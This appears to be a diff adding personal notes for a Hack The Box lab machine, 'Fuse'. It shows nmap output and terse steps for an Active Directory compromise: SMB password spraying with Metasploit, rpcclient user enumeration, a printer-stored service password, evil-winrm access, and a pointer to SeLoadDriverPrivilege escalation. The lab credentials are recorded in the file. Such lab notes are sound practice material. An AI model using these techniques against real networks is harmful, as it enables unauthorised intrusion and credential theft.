@@ -1,0 +1,107 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 15:01 EDT
+Nmap scan report for fuse.htb (10.10.10.193)
+Host is up (0.056s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-08-10 19:16:40Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=8/10%Time=5F3199AD%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h34m43s, deviation: 4h02m36s, median: 14m39s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE\x00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System time: 2020-08-10T12:17:17-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-08-10T19:17:14
+|_  start_date: 2020-08-10T19:14:26
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 196.54 seconds
+
+################################################################################
+FOOTHOLD
+################################################################################
+
+smb login with usernames on site AND cewl for potential pwds
+msf console scanner/smb/smb_login
+working smb creds:
+  - tlavel:Fabricorp01
+  - bhult:Fabricorp01
+smbpasswd to change pass
+rpc client to log in
+enumdomusers has logins:
+  name:[FABRICORP] idx:[0x0]
+  name:[Builtin] idx:[0x0]
+  rpcclient $> enumdomusers
+  user:[Administrator] rid:[0x1f4]
+  user:[Guest] rid:[0x1f5]
+  user:[krbtgt] rid:[0x1f6]
+  user:[DefaultAccount] rid:[0x1f7]
+  user:[svc-print] rid:[0x450]
+  user:[bnielson] rid:[0x451]
+  user:[sthompson] rid:[0x641]
+  user:[tlavel] rid:[0x642]
+  user:[pmerton] rid:[0x643]
+  user:[svc-scan] rid:[0x645]
+  user:[bhult] rid:[0x1bbd]
+  user:[dandrews] rid:[0x1bbe]
+  user:[mberbatov] rid:[0x1db1]
+  user:[astein] rid:[0x1db2]
+  user:[dmuir] rid:[0x1db3]
+
+enumprinters has juicy pwd
+  - $fab@s3Rv1ce$1
+
+msfconsole: winrm_login
+evil_wm -i -u -p
+
+################################################################################
+ROOT
+################################################################################
+
+'whoami /all' big privileges:
+  PRIVILEGES INFORMATION                                               
+  ----------------------                                               
+                                                                       
+  Privilege Name                Description                    State
+  ============================= ============================== ======= 
+  SeMachineAccountPrivilege     Add workstations to domain     Enabled 
+  SeLoadDriverPrivilege         Load and unload device drivers Enabled 
+    ^ exploitable:
+        https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
+  SeShutdownPrivilege           Shut down the system           Enabled 
+  SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+  SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
